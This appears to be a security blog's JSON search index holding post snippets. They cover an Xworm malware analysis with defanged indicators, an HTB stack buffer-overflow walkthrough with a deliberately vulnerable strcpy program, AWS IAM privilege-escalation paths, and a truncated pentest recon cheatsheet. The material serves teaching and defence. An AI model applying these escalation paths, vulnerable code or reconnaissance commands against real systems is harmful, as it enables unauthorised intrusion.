[ { "title": "Malware Analysis of Xworm", "url": "/blog/posts/Malware-Analysis/", "categories": "Malware, Threat", "tags": "Malware, Analysis, .Net, Powershell", "date": "2024-03-31 14:10:00 +0800", "snippet": "XwormXworm represents a form of malware, targeting Windows systems. Upon infection, it can compromise the security of the system, potentially leading to data theft or unauthorized remote access. This type of malware poses significant risks to computer systems and underscores the importance of robust cybersecurity measures to prevent and mitigate such threats.Sample CollectionStage1Extracted the sample from Malwarebazar with the password “infected”.The sample has an extension of .vbs, so dont run it, instead open with notepad++.Its a straightforward obfuscation. The function Tightness which takes the decimal value and return ASCII, which is (101) for letter ‘e’, and after deobfuscation and building the final URL, we can see proper clean code.The code is trying to download and execute the content of the resource at the URL.So lets curl the URL and get the file content downloaded… and it says 404 as of now the resource is not available at the URLSo we have a problem here, while I am analysing the sample the content or the payload which needs to get downloaded during the execution of the above vbs script is no more available in the pastebin…. so how are we going to analyse it….!!!!After searching a lot on the internet, I was not getting the same file from any sandbox or any Malware sample stores, So while I discussed the situation with my friend “Binary Panda” who does similar stunts with malware, so we both where trying to find the sample in different sandboxes. Meanwhile, in one of the popular sandbox we saw there is a way to download pcap files for the sample which it has analyzed. That triggered a good idea!! Why can’t we recreate the sample back from the pcap file!!!!Building the sample from the response header.Yess!!! and that did solve our problem.We recreated the sample from the dead just from the pcap file.Here begins our stage2Stage2Opened the file in notepad++ again to see the contents of the file.In this file, we can see a powershell command which is going to get executed when we open the file. Below is the rest of the powershell script which is going to get executed. The script is executed with the Wscipt.exe processThe above code is obfuscated, so after reading the last of the command &#39;DgTre&#39; is replaced with the letter &#39;A&#39;. So cleaned the code accordingly. The rest of the part is a base64 encoded string.So decoded with CyberChef.After decoding that we get a powershell script which needs some rearrangement.Here is the clean powershell script.So the what the script does is it retrieve data from a series of URLs.Stage3It scans the downloaded content for a segment delineated by &amp;lt;&amp;lt;BASE64_START&amp;gt;&amp;gt; and &amp;lt;&amp;lt;BASE64_END&amp;gt;&amp;gt; markers, presuming this portion to be base64-encoded.So here we have two URLs that need to be downloaded for further analysis.But the file content is no longer available in the location!!The same thing happened here too the file is not present in the location, so we recreated it with PCAP file which we downloaded before.After building the jpeg file, open it in a HxDSeems like we need some cleaning to bring a real jpg file.Nice isn’t it…Will Keep it as a Desktop Background xDNow as per the powershell script, there are Flags &amp;lt;&amp;lt;BASE64_START&amp;gt;&amp;gt; and &amp;lt;&amp;lt;BASE64_END&amp;gt;&amp;gt; which we need to find from the file.So seems like a sense of steganography technique is implemented here..Let’s find it in HxDScrolling through the HxD we saw &amp;lt;&amp;lt;BASE64_START&amp;gt;&amp;gt; and &amp;lt;&amp;lt;BASE64_END&amp;gt;&amp;gt; flags.So let’s decode the base64 string in CyberchefWhile decoding we were able to see the magic bytes of an EXE file. So we save the output from Cyberchef.Since it is an exe file, open it in DIE (Detect it Easy)The file seems to be written in .NETLet open it in dnSpyPersistence TechniqueAfter searching through the .NET code, a method of ensuring persistence can be seen. This involves the program inserting itself into a registry key, enabling it to launch automatically upon each system startup. This persistence tactic helps the malware to maintain a foothold within the compromised system. IOCs: hxxps://uploaddeimagens[.]com[.]br/images/004/739/227/original/new_image.jpg?1707826222hxxp://45[.]74[.]19[.]84/xampp/bkp/vbs_novo_new_image[.]jpghxxps://wayoutkwt[.]com/bk/fexrw[.]txthxxps://pastebin[.]com/raw/G9zY5tnhfebxworm39090[.]duckdns[.]org45[.]74[.]19[.]8485673635.vbs — 032c2cc1862303d06832c0ebe34b9daePROJETOAUTOMACAO.VB1.dll — ce91eb459e4f6a9e2871088d855cd211febxworm39090.exe — 1a2b23fd06525561826e61fc104b66d0vbs_novo_new_image.jpg — ddb09774c5a870c73cf0cf71e6d97d3eoutput.273230999.txt — 983865b130c91b9b3a36d488afbdd1bd Reference https://medium.com/@b.magnezi/malware-analysis-xworm-80b3bbb072fb https://www.joesandbox.com/analysis/1395432/0/html https://malpedia.caad.fkie.fraunhofer.de/details/win.xworm" }, { "title": "DUCTF 2021", "url": "/blog/posts/Duck-CTF/", "categories": "CTF, DUCTF", "tags": "CTF", "date": "2021-08-28 00:34:00 +0800", "snippet": "" }, { "title": "Overly Permisive IAM resources", "url": "/blog/posts/Overly-Permisive-IAM-resources/", "categories": "AWS Pentesting, AWS IAM Exploitation", "tags": "IAM, cloud, AWS", "date": "2021-08-08 14:10:00 +0800", "snippet": "What are IAM Resources?The user, group, role, policy, and identity provider objects that are stored in IAM. As with other AWS services, you can add, edit, and remove resources from IAM.Done." }, { "title": "Stack-Based Buffer Overflow Linux x86", "url": "/blog/posts/Stack-Based-Buffer-Overflow/", "categories": "BOF, Linux x86", "tags": "shellcode, BOF, ExploitDev", "date": "2021-08-08 11:33:00 +0800", "snippet": " This is a walkthrough of the HTB Academy Module for Stack-Based Buffer Overflow on Linux x86.Buffer Overflow Introduction:Buffer overflows are among the most common security vulnerabilities in software applications that can be exploited over the Internet. In short, buffer overflows are caused by incorrect program code, which cannot process too large amounts of data correctly by the CPU and can, therefore, manipulate the CPU’s processing.A buffer overflow can cause the program to crash, corrupt data, or harm data structures in the program’s runtime. The last of these can overwrite the specific program’s return address with arbitrary data, allowing an attacker to execute commands with the privileges of the process vulnerable to the buffer overflow by passing arbitrary machine code. This code is usually intended to give us more convenient access to the system to use it for our own purposes. Such buffer overflows in common servers, and Internet worms also exploit client software.A particularly popular target on Unix systems is root access, which gives us all permissions to access the system. However, as is often misunderstood, this does not mean that a buffer overflow that “only” leads to the privileges of a standard user is harmless. Getting the coveted root access is often much easier if you already have user privileges.Buffer overflows, in addition to programming carelessness, are mainly made possible by computer systems based on the Von-Neumann architecture.The most significant cause of buffer overflows is the use of programming languages that do not automatically monitor limits of memory buffer or stack to prevent (stack-based) buffer overflow. These include the C and C++ languages, which emphasize performance and do not require monitoring.For this reason, developers are forced to define such areas in the programming code themselves, which increases vulnerability many times over. These areas are often left undefined for testing purposes or due to carelessness. Even if they were used for testing purposes, they might have been overlooked at the end of the development process.Exploit Development IntroductionExploit development comes in the Exploitation Phase after specific software and even its versions have been identified. The Exploitation Phase goal is to use the information found and its analysis to exploit the potential ways to gain interaction and/or access to the target system.Developing our own exploits can be very complex and requires a deep understanding of CPU operations and the software’s functions that serve as our target. Many exploits are written in different programming languages. One of the most popular programming languages for this is Python because it is easy to understand and easy to write with. In this module, we will focus on basic techniques for exploit development, as a fundamental understanding must be developed before we can deal with the various security mechanisms of memory.Before we run any exploits, we need to understand what an exploit is. An exploit is a code that causes the service to perform an operation we want by abusing the found vulnerability. Such codes often serve as proof-of-concept (POC) in our reports.There are two types of exploits. One is unknown (0-day exploits), and the other is known (N-day exploits).0-Day ExploitsAn 0-day exploit is a code that exploits a newly identified vulnerability in a specific application. The vulnerability does not need to be public in the application. The danger with such exploits is that if the developers of this application are not informed about the vulnerability, they will likely persist with new updates.N-Day ExploitsIf the vulnerability is published and informs the developers, they will still need time to write a fix to prevent them as soon as possible. When they are published, they talk about N-day exploits, counting the days between the publication of the exploit and an attack on the unpatched systems.Also, these exploits can be divided into four different categories:LocalRemoteDoSWebAppLocal ExploitsLocal exploits / Privilege Escalation exploits can be executed when opening a file. However, the prerequisite for this is that the local software contains a security vulnerability. Often a local exploit (e.g., in a PDF document or as a macro in a Word or Excel file) first tries to exploit security holes in the program with which the file was imported to achieve a higher privilege level and thus load and execute malicious code / shellcode in the operating system. The actual action that the exploit performs is called payload.Remote ExploitsThe remote exploits very often exploit the buffer overflow vulnerability to get the payload running on the system. This type of exploits differs from local exploits because they can be executed over the network to perform the desired operation.DoS ExploitsDoS (Denial of Service) exploits are codes that prevent other systems from functioning, i.e., cause a crash of individual software or the entire system.WebApp ExploitsA Web application exploit uses a vulnerability in such software. Such vulnerabilities can, for example, allow a command injection on the application itself or the underlying database.CPU ArchitectureThe architecture of the Von-Neumann was developed by the Hungarian mathematician John von Neumann, and it consists of four functional units:MemoryControl UnitArithmetical Logical UnitInput/Output UnitIn the Von-Neumann architecture, the most important units, the Arithmetical Logical Unit (ALU) and Control Unit (CU), are combined in the actual Central Processing Unit (CPU). The CPU is responsible for executing the instructions and for flow control. The instructions are executed one after the other, step by step. The commands and data are fetched from memory by the CU. The connection between processor, memory, and input/output unit is called a bus system, which is not mentioned in the original Von-Neumann architecture but plays an essential role in practice. In the Von-Neumann architecture, all instructions and data are transferred via the bus system.Von-Neumann ArchitectureMemoryThe memory can be divided into two different categories:Primary MemorySecondary MemoryPrimary MemoryThe primary memory is the Cache and Random Access Memory (RAM). If we think about it logically, memory is nothing more than a place to store information. We can think of it as leaving something at one of our friends to pick it up again later. But for this, it is necessary to know the friend’s address to pick up what we have left behind. It is the same as RAM. RAM describes a memory type whose memory allocations can be accessed directly and randomly by their memory addresses.The cache is integrated into the processor and serves as a buffer, which in the best case, ensures that the processor is always fed with data and program code. Before the program code and data enter the processor for processing, the RAM serves as data storage. The size of the RAM determines the amount of data that can be stored for the processor. However, when the primary memory loses power, all stored contents are lost.Secondary MemoryThe secondary memory is the external data storage, such as HDD/SSD, Flash Drives and CD/DVD-ROMs of a computer, which is not directly accessed by the CPU, but via the I/O interfaces. In other words, it is a mass storage device. It is used to permanently store data that does not need to be processed at the moment. Compared to primary memory, it has a higher storage capacity, can store data permanently even without a power supply, and works much slower.Control UnitThe Control Unit (CU) is responsible for the correct interworking of the processor’s individual parts. An internal bus connection is used for the tasks of the CU. The tasks of the CU can be summarised as follows:Reading data from the RAMSaving data in RAMProvide, decode and execute an instructionProcessing the inputs from peripheral devicesProcessing of outputs to peripheral devicesInterrupt controlMonitoring of the entire systemThe CU contains the Instruction Register (IR), which contains all instructions that the processor decodes and executes accordingly. The instruction decoder translates the instructions and passes them to the execution unit, which then executes the instruction. The execution unit transfers the data to the ALU for calculation and receives the result back from there. The data used during execution is temporarily stored in registers.Central Processing UnitThe Central Processing Unit (CPU) is the functional unit in a computer that provides the actual processing power. It is responsible for processing information and controlling the processing operations. To do this, the CPU fetches commands from memory one after the other and initiates data processing.The processor is also often referred to as a Microprocessor when placed in a single electronic circuit, as in our PCs.Each CPU has an architecture on which it was built. The best-known CPU architectures are:x86/i386 - (AMD &amp;amp; Intel)x86-64/amd64 - (Microsoft &amp;amp; Sun)ARM - (Acorn)Each of these CPU architectures is built in a specific way, called Instruction Set Architecture (ISA), which the CPU uses to execute its processes. ISA, therefore, describes the behavior of a CPU concerning the instruction set used. The instruction sets are defined so that they are independent of a specific implementation. Above all, ISA gives us the possibility to understand the unified behavior of machine code in assembly language concerning registers, data types, etc.There are four different types of ISA:CISC - Complex Instruction Set ComputingRISC - Reduced Instruction Set ComputingVLIW - Very Long Instruction WordEPIC - Explicitly Parallel Instruction ComputingRISCRISC stands for Reduced Instruction Set Computer, a design of microprocessors architecture that aimed to simplify the complexity of the instruction set for assembly programming to one clock cycle. This leads to higher clock frequencies of the CPU but enables a faster execution because smaller instruction sets are used. By an instruction set, we mean the set of machine instructions that a given processor can execute. We can find RISC in most smartphones today, for example. Nevertheless, pretty much all CPUs have a portion of RISC in them. RISC architectures have a fixed length of instructions defined as 32-bit and 64-bit.CISCIn contrast to RISC, the Complex Instruction Set Computer (CISC) is a processor architecture with an extensive and complex instruction set. Due to the historical development of computers and their memory, recurring sequences of instructions were combined into complicated instructions in second-generation computers. The addressing in CISC architectures does not require 32-bit or 64-bit in contrast to RISC but can be done with an 8-bit mode.Instruction CycleThe instruction set describes the totality of the machine instructions of a processor. The scope of the instruction set varies considerably depending on the processor type. Each CPU may have different instruction cycles and instruction sets, but they are all similar in structure, which we can summarize as follows: Instruction Description 1. FETCH The next machine instruction address is read from the Instruction Address Register (IAR). It is then loaded from the Cache or RAM into the Instruction Register (IR). 2. DECODE The instruction decoder converts the instructions and starts the necessary circuits to execute the instruction. 3. FETCH OPERANDS If further data have to be loaded for execution, these are loaded from the cache or RAM into the working registers. 4. EXECUTE The instruction is executed. This can be, for example, operations in the ALU, a jump in the program, the writing back of results into the working registers, or the control of peripheral devices. Depending on the result of some instructions, the status register is set, which can be evaluated by subsequent instructions. 5. UPDATE INSTRUCTION POINTER If no jump instruction has been executed in the EXECUTE phase, the IAR is now increased by the length of the instruction so that it points to the next machine instruction. Stack-Based Buffer OverflowBuffer overflows are the operating system’s reaction to an error in existing software or during the execution of these. This is responsible for most of the security vulnerabilities in program flows in the last decade. Programming errors often occur, leading to buffer overflows due to inattention when programming with low abstract languages such as C or C++.These languages are compiled almost directly to machine code and, in contrast to highly abstracted languages such as Java or Python, run through little to no control structure operating system. Buffer overflows are errors that allow data that is too large to fit into a buffer of the operating system’s memory that is not large enough, thereby overflowing this buffer. As a result of this mishandling, the memory of other functions of the executed program is overwritten, potentially creating a security vulnerability.Such a program (binary file), is a general executable file stored on a data storage medium. There are several different file formats for such executable binary files. For example, the Portable Executable Format (PE) is used on Microsoft platforms.Another format for executable files is the Executable and Linking Format (ELF), supported by almost all modern UNIX variants. If the linker loads such an executable binary file and the program will be executed, the corresponding program code will be loaded into the main memory and then executed by the CPU.Programs store data and instructions in memory during initialization and execution. These are data that are displayed in the executed software or entered by the user. Especially for expected user input, a buffer must be created beforehand by saving the input.The instructions are used to model the program flow. Among other things, return addresses are stored in the memory, which refers to other memory addresses and thus define the program’s control flow. If such a return address is deliberately overwritten by using a buffer overflow, an attacker can manipulate the program flow by having the return address refer to another function or subroutine. Also, it would be possible to jump back to a code previously introduced by the user input.To understand how it works on the technical level, we need to become familiar with how:the memory is divided and usedthe debugger displays and names the individual instructionsthe debugger can be used to detect such vulnerabilitieswe can manipulate the memoryAnother critical point is that the exploits usually only work for a specific version of the software and operating system. Therefore, we have to rebuild and reconfigure the target system to bring it to the same state. After that, the program we are investigating is installed and analyzed. Most of the time, we will only have one attempt to exploit the program if we miss the opportunity to restart it with elevated privileges.The MemoryWhen the program is called, the sections are mapped to the segments in the process, and the segments are loaded into memory as described by the ELF file.Buffer.textThe .text section contains the actual assembler instructions of the program. This area can be read-only to prevent the process from accidentally modifying its instructions. Any attempt to write to this area will inevitably result in a segmentation fault..dataThe .data section contains global and static variables that are explicitly initialized by the program..bssSeveral compilers and linkers use the .bss section as part of the data segment, which contains statically allocated variables represented exclusively by 0 bits.The HeapHeap memory is allocated from this area. This area starts at the end of the “.bss” segment and grows to the higher memory addresses.The StackStack memory is a Last-In-First-Out data structure in which the return addresses, parameters, and, depending on the compiler options, frame pointers are stored. C/C++ local variables are stored here, and you can even copy code to the stack. The Stack is a defined area in RAM. The linker reserves this area and usually places the stack in RAM’s lower area above the global and static variables. The contents are accessed via the stack pointer, set to the upper end of the stack during initialization. During execution, the allocated part of the stack grows down to the lower memory addresses.Modern memory protections (DEP/ASLR) would prevent the execution of such code against buffer overflows.Vulnerable ProgramWe are now writing a simple C-program called bow.c with a vulnerable function called strcpy().Bow.c#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;int bowfunc(char *string) { char buffer[1024]; strcpy(buffer, string); return 1;}int main(int argc, char *argv[]) { bowfunc(argv[1]); printf(&quot;Done.\\n&quot;); return 1;}Disable ASLRNext, we compile the C code into a 32bit ELF binary.Compilation┌──(root💀kali)-[~/Downloads/hackthebox/bof-module]└─# gcc bow.c -o bow32 -fno-stack-protector -z execstack -m32 ┌──(root💀kali)-[~/Downloads/hackthebox/bof-module]└─# file bow32 | tr &quot;,&quot; &quot;\\n&quot;bow32: ELF 32-bit LSB pie executable Intel 80386 version 1 (SYSV) dynamically linked interpreter /lib/ld-linux.so.2 BuildID[sha1]=9e11d6435455788ef01253074df027de57980c87 for GNU/Linux 3.2.0 not strippedVulnerable C FunctionsThere are several vulnerable functions in the C programming language that do not independently protect the memory. Here are some of the functions:strcpygetssprintfscanfstrcat...GDB IntroductionsGDB, or the GNU Debugger, is the standard debugger of Linux systems developed by the GNU Project. It has been ported to many systems and supports the programming languages C, C++, Objective-C, FORTRAN, Java, and many more.GDB provides us with the usual traceability features like breakpoints or stack trace output and allows us to intervene in the execution of programs. It also allows us, for example, to manipulate the variables of the application or to call functions independently of the normal execution of the program.We use GNU Debugger (GDB) to view the created binary on the assembler level. Once we have executed the binary with GDB, we can disassemble the program’s main function.GDB - AT&amp;amp;T Syntax┌──(root💀kali)-[~/Downloads/hackthebox/bof-module]└─# gdb -q bow32Reading symbols from bow32...(No debugging symbols found in bow32)gdb-peda$ disassemble mainDump of assembler code for function main: 0x000011de &amp;lt;+0&amp;gt;: lea ecx,[esp+0x4] 0x000011e2 &amp;lt;+4&amp;gt;: and esp,0xfffffff0 0x000011e5 &amp;lt;+7&amp;gt;: push DWORD PTR [ecx-0x4] 0x000011e8 &amp;lt;+10&amp;gt;: push ebp 0x000011e9 &amp;lt;+11&amp;gt;: mov ebp,esp 0x000011eb &amp;lt;+13&amp;gt;: push ebx 0x000011ec &amp;lt;+14&amp;gt;: push ecx 0x000011ed &amp;lt;+15&amp;gt;: call 0x10b0 &amp;lt;__x86.get_pc_thunk.bx&amp;gt; 0x000011f2 &amp;lt;+20&amp;gt;: add ebx,0x2e0e 0x000011f8 &amp;lt;+26&amp;gt;: mov eax,ecx 0x000011fa &amp;lt;+28&amp;gt;: mov eax,DWORD PTR [eax+0x4] 0x000011fd &amp;lt;+31&amp;gt;: add eax,0x4 0x00001200 &amp;lt;+34&amp;gt;: mov eax,DWORD PTR [eax] 0x00001202 &amp;lt;+36&amp;gt;: sub esp,0xc 0x00001205 &amp;lt;+39&amp;gt;: push eax 0x00001206 &amp;lt;+40&amp;gt;: call 0x11a9 &amp;lt;bowfunc&amp;gt; 0x0000120b &amp;lt;+45&amp;gt;: add esp,0x10 0x0000120e &amp;lt;+48&amp;gt;: sub esp,0xc 0x00001211 &amp;lt;+51&amp;gt;: lea eax,[ebx-0x1ff8] 0x00001217 &amp;lt;+57&amp;gt;: push eax 0x00001218 &amp;lt;+58&amp;gt;: call 0x1040 &amp;lt;puts@plt&amp;gt; 0x0000121d &amp;lt;+63&amp;gt;: add esp,0x10 0x00001220 &amp;lt;+66&amp;gt;: mov eax,0x1 0x00001225 &amp;lt;+71&amp;gt;: lea esp,[ebp-0x8] 0x00001228 &amp;lt;+74&amp;gt;: pop ecx 0x00001229 &amp;lt;+75&amp;gt;: pop ebx 0x0000122a &amp;lt;+76&amp;gt;: pop ebp 0x0000122b &amp;lt;+77&amp;gt;: lea esp,[ecx-0x4] 0x0000122e &amp;lt;+80&amp;gt;: ret End of assembler dump.gdb-peda$ In the first column, the hexadecimal numbers represent the memory addresses. The numbers with the plus sign (+) show the address jumps in memory in bytes, used for the respective instruction. Next, we can see the assembler instructions (mnemonics) with registers and their operation suffixes. The current syntax is AT&amp;amp;T, which we can recognize by the % and $ characters.| Memory Address | Address Jumps | Assembler Instruction | Operation Suffixes ||—————-|—————|———————–|——————–|| 0x000011de | &amp;lt;+0&amp;gt;: | lea | 0x4(%esp),%ecx || 0x000011e2 | &amp;lt;+4&amp;gt;: | and | $0xfffffff0,%esp |The Intel syntax makes the disassembled representation easier to read, and we can change the syntax by entering the following commands in GDB:GDB - Change the Syntax to Intelgdb-peda$ set disassembly-flavor intelgdb-peda$ disassemble mainDump of assembler code for function main: 0x000011de &amp;lt;+0&amp;gt;: lea ecx,[esp+0x4] 0x000011e2 &amp;lt;+4&amp;gt;: and esp,0xfffffff0 0x000011e5 &amp;lt;+7&amp;gt;: push DWORD PTR [ecx-0x4] 0x000011e8 &amp;lt;+10&amp;gt;: push ebp 0x000011e9 &amp;lt;+11&amp;gt;: mov ebp,esp 0x000011eb &amp;lt;+13&amp;gt;: push ebx 0x000011ec &amp;lt;+14&amp;gt;: push ecx 0x000011ed &amp;lt;+15&amp;gt;: call 0x10b0 &amp;lt;__x86.get_pc_thunk.bx&amp;gt; 0x000011f2 &amp;lt;+20&amp;gt;: add ebx,0x2e0e 0x000011f8 &amp;lt;+26&amp;gt;: mov eax,ecx 0x000011fa &amp;lt;+28&amp;gt;: mov eax,DWORD PTR [eax+0x4] 0x000011fd &amp;lt;+31&amp;gt;: add eax,0x4 0x00001200 &amp;lt;+34&amp;gt;: mov eax,DWORD PTR [eax] 0x00001202 &amp;lt;+36&amp;gt;: sub esp,0xc 0x00001205 &amp;lt;+39&amp;gt;: push eax 0x00001206 &amp;lt;+40&amp;gt;: call 0x11a9 &amp;lt;bowfunc&amp;gt; 0x0000120b &amp;lt;+45&amp;gt;: add esp,0x10 0x0000120e &amp;lt;+48&amp;gt;: sub esp,0xc 0x00001211 &amp;lt;+51&amp;gt;: lea eax,[ebx-0x1ff8] 0x00001217 &amp;lt;+57&amp;gt;: push eax 0x00001218 &amp;lt;+58&amp;gt;: call 0x1040 &amp;lt;puts@plt&amp;gt; 0x0000121d &amp;lt;+63&amp;gt;: add esp,0x10 0x00001220 &amp;lt;+66&amp;gt;: mov eax,0x1 0x00001225 &amp;lt;+71&amp;gt;: lea esp,[ebp-0x8] 0x00001228 &amp;lt;+74&amp;gt;: pop ecx 0x00001229 &amp;lt;+75&amp;gt;: pop ebx 0x0000122a &amp;lt;+76&amp;gt;: pop ebp 0x0000122b &amp;lt;+77&amp;gt;: lea esp,[ecx-0x4] 0x0000122e &amp;lt;+80&amp;gt;: ret End of assembler dump.gdb-peda$ We don’t have to change the display mode manually continually. We can also set this as the default syntax with the following command.Change GDB Syntax┌──(root💀kali)-[~/Downloads/hackthebox/bof-module]└─# echo &#39;set disassembly-flavor intel&#39; &amp;gt; ~/.gdbinitIf we now rerun GDB and disassemble the main function, we see the Intel syntax.GDB - Intel Syntax──(root💀kali)-[~/Downloads/hackthebox/bof-module]└─# gdb ./bow32 -q 130 ⨯Reading symbols from ./bow32...(No debugging symbols found in ./bow32)gdb-peda$ disassemble mainDump of assembler code for function main: 0x000011de &amp;lt;+0&amp;gt;: lea ecx,[esp+0x4] 0x000011e2 &amp;lt;+4&amp;gt;: and esp,0xfffffff0 0x000011e5 &amp;lt;+7&amp;gt;: push DWORD PTR [ecx-0x4] 0x000011e8 &amp;lt;+10&amp;gt;: push ebp 0x000011e9 &amp;lt;+11&amp;gt;: mov ebp,esp 0x000011eb &amp;lt;+13&amp;gt;: push ebx 0x000011ec &amp;lt;+14&amp;gt;: push ecx 0x000011ed &amp;lt;+15&amp;gt;: call 0x10b0 &amp;lt;__x86.get_pc_thunk.bx&amp;gt; 0x000011f2 &amp;lt;+20&amp;gt;: add ebx,0x2e0e 0x000011f8 &amp;lt;+26&amp;gt;: mov eax,ecx 0x000011fa &amp;lt;+28&amp;gt;: mov eax,DWORD PTR [eax+0x4] 0x000011fd &amp;lt;+31&amp;gt;: add eax,0x4 0x00001200 &amp;lt;+34&amp;gt;: mov eax,DWORD PTR [eax] 0x00001202 &amp;lt;+36&amp;gt;: sub esp,0xc 0x00001205 &amp;lt;+39&amp;gt;: push eax 0x00001206 &amp;lt;+40&amp;gt;: call 0x11a9 &amp;lt;bowfunc&amp;gt; 0x0000120b &amp;lt;+45&amp;gt;: add esp,0x10 0x0000120e &amp;lt;+48&amp;gt;: sub esp,0xc 0x00001211 &amp;lt;+51&amp;gt;: lea eax,[ebx-0x1ff8] 0x00001217 &amp;lt;+57&amp;gt;: push eax 0x00001218 &amp;lt;+58&amp;gt;: call 0x1040 &amp;lt;puts@plt&amp;gt; 0x0000121d &amp;lt;+63&amp;gt;: add esp,0x10 0x00001220 &amp;lt;+66&amp;gt;: mov eax,0x1 0x00001225 &amp;lt;+71&amp;gt;: lea esp,[ebp-0x8] 0x00001228 &amp;lt;+74&amp;gt;: pop ecx 0x00001229 &amp;lt;+75&amp;gt;: pop ebx 0x0000122a &amp;lt;+76&amp;gt;: pop ebp 0x0000122b &amp;lt;+77&amp;gt;: lea esp,[ecx-0x4] 0x0000122e &amp;lt;+80&amp;gt;: ret End of assembler dump.gdb-peda$ The difference between the AT&amp;amp;T and Intel syntax is not only in the presentation of the instructions with their symbols but also in the order and direction in which the instructions are executed and read.Let us take the following instruction as an example:0x000011e9 &amp;lt;+11&amp;gt;: mov ebp,espWith the Intel syntax, we have the following order for the instruction from the example:Intel Syntax Instruction Destination Source mov ebp esp AT&amp;amp;T Syntax Instruction Source Destination mov %esp %ebp " }, { "title": "AWS IAM Exploitation", "url": "/blog/posts/AWS-IAM-Exploitation/", "categories": "AWS Pentesting, AWS IAM Exploitation", "tags": "AWS, IAM", "date": "2021-01-04 07:32:00 +0800", "snippet": "What is IAM?In AWS Identity and Access Management (IAM) is a web service that helps you securely control access to AWS resources. You use IAM to control who is authenticated (signed in) and authorized (has permissions) to use resources.It helps you set up users and groups, and shows you how to protect your resources with access control policies. It also shows how to connect to other identity services to grant external users access to your AWS resources.So, a simple misconfiguration in IAM can lead to privilege escalation, which then can lead to furthur exploitations.PoliciesThe IAM uses policies (JSON format) for assigning actions for the users and roles which are attached to ceratin groups.Services like S3 bucket for example have policy attached to them which allow users to do certain actions like listing bucket files or uploading files to the bucket etc.Some services can have policies attached to them in the form of roles, that can be in the form of either a service-linked roles, where the service is granted to the role or having a role attached to a component in the service.Policy is attached to a resource, such as a user account, EC2 instance, or internal AWS function, allowing that resource to make API calls to execute actions within the account. A policy that allows a user to retrieve objects from an S3 bucket may look like this:{ &quot;Effect&quot;: &quot;Allow&quot;, &quot;Action&quot;: [ &quot;s3:GetObject&quot; ], &quot;Resource&quot;: [ &quot;arn:aws:s3:::my-bucket/*&quot; ]}Types of IAM policiesIdentity-based policiesResource-based policiesPermission boundariesOrganizations service control policies (SCPs)Access control lists (ACLs)Session policiesOverly-permissive IAM policiesIf policies assigned in IAM permissions to a user, an attacker could use IAM API calls to elevate his privileges. Example:Consider a AWS user Alice only has privileges to access IAM API calls, IAM:* for short Alice uses those privileges to create a new user: Bob Alice creates a new role with permissions to access all AWS services Alice assigns the newly created role to Bob Alice creates access keys for the user BobThe permission set assigned to the user Bob would look like:{ &quot;Version&quot;: &quot;2012-10-17&quot;, &quot;Statement&quot;: [ { &quot;Effect&quot;: &quot;Allow&quot;, &quot;Action&quot;: &quot;*&quot;, &quot;Resource&quot;: &quot;*&quot; } ]}To run this attack Alice requires at least these IAM permissions: CreateUser CreateAccessKey PutUserPolicyIt is important to notice that it would be also possible to achieve the same goal using other calls to the IAMservice, for example it is possible to create a group, assign the policy to that group and then make the newlycreated user part of the group; or even make Alice part of the new group with high privileges.Dangerous permissions for users:Policy attachment: The attacker can directly escalate their privileges by attaching a policy containing permissions higher than their own to their user, role, or a group of which their user is a member. Related permissions: &amp;gt; iam:PutGroupPolicy &amp;gt; iam:PutRolePolicy &amp;gt; iam:PutUserPolicy &amp;gt; iam:AttachGroupPolicy &amp;gt; iam:AttachRolePolicy &amp;gt; iam:AttachUserPolicyPolicy versioning: The attacker can create a new version of a policy attached to their user entity that has higher permission or they can revert their existing policy to an older version with more permissive/different grants. Related permissions: &amp;gt; iam:CreatePolicyVersion &amp;gt; iam:SetDefaultPolicyVersionGroup management: The attacker can move their user to a group that grants greater privileges. Related permissions: &amp;gt; iam:AddUserToGroupUser Management: The attacker can create or change the console access credentials for another user then log into the console as that user or generate a new access key for another user then call the APIs directly. Related permissions: &amp;gt; iam:CreateLoginProfile &amp;gt; iam:UpdateLoginProfile &amp;gt; iam:CreateAccessKeyService roles: The attacker can pass a privileged role to an AWS service then access its temporary credentials in order to perform privileged actions. Related permissions: &amp;gt; iam:PassRoleFor services like EC2 require additional permissions, such ec2:AssociateIamInstanceProfile. This permission is an extremely dangerous one to grant as it can be used to escalate privileges via a confused deputy attack.A confused deputy attack is when a entity with a set of permissions is induced to act in a manner specified by another entity. The malicious entity is then able to perform some privileged action it otherwise could not by abusing the victim entity.Methods and Tools to Enumerate IAM:During Pentesting if you get your hands on a set of AWS credentials and have no idea which permissions it might have then you can use the following set of tools:Principal Mapper: PMaapperPrincipal Mapper (PMapper) is a script and library for identifying risks in the configuration of AWS Identity and Access Management (IAM) for an AWS account or an AWS organization. It models the different IAM Users and Roles in an account as a directed graph, which enables checks for privilege escalation and for alternate paths an attacker could take to gain access to a resource or action in AWS.PMapper includes a querying mechanism that uses a local simulation of AWS’s authorization behavior. When running a query to determine if a principal has access to a certain action/resource, PMapper also checks if the user or role could access other users or roles that have access to that action/resource. This catches scenarios such as when a user doesn’t have permission to read an S3 object, but could launch an EC2 instance that can read the S3 object.Pacu:Pacu is an open-source AWS exploitation framework, designed for offensive security testing against cloud environments. Created and maintained by Rhino Security Labs, Pacu allows penetration testers to exploit configuration flaws within an AWS account, using modules to easily expand its functionality. This tool currently supports a range of attacks, including user privilege escalation, backdooring of IAM users, attacking vulnerable Lambda functions, and much more.Remediation:Do not allow any IAM entity to Add, Update, Modify, Delete Policies within the AWS account." }, { "title": "HackTheBox", "url": "/blog/posts/Boot-to-Root/", "categories": "Boot2root, HackTheBox", "tags": "HTB, writeups", "date": "2019-08-11 00:34:00 +0800", "snippet": "" }, { "title": "Pentesting Cheatsheets", "url": "/blog/posts/Pentesting-Cheatsheets/", "categories": "Pentesting, Cheatsheet", "tags": "Pentest, OSCP, CTF", "date": "2019-08-09 20:55:00 +0800", "snippet": "Reconnaissance / EnumerationExtracting Live IPs from Nmap Scannmap 10.1.1.1 --open -oG scan-results; cat scan-results | grep &quot;/open&quot; | cut -d &quot; &quot; -f 2 &amp;gt; exposed-services-ipsSimple Port Knockingfor x in 7000 8000 9000; do nmap -Pn –host_timeout 201 –max-retries 0 -p $x 1.1.1.1; doneDNS lookups, Zone Transfers &amp;amp; Brute-Forcewhois domain.comdig {a|txt|ns|mx} domain.comdig {a|txt|ns|mx} domain.com @ns1.domain.comhost -t {a|txt|ns|mx} megacorpone.comhost -a megacorpone.comhost -l megacorpone.com ns1.megacorpone.comdnsrecon -d megacorpone.com -t axfr @ns2.megacorpone.comdnsenum domain.comnslookup -&amp;gt; set type=any 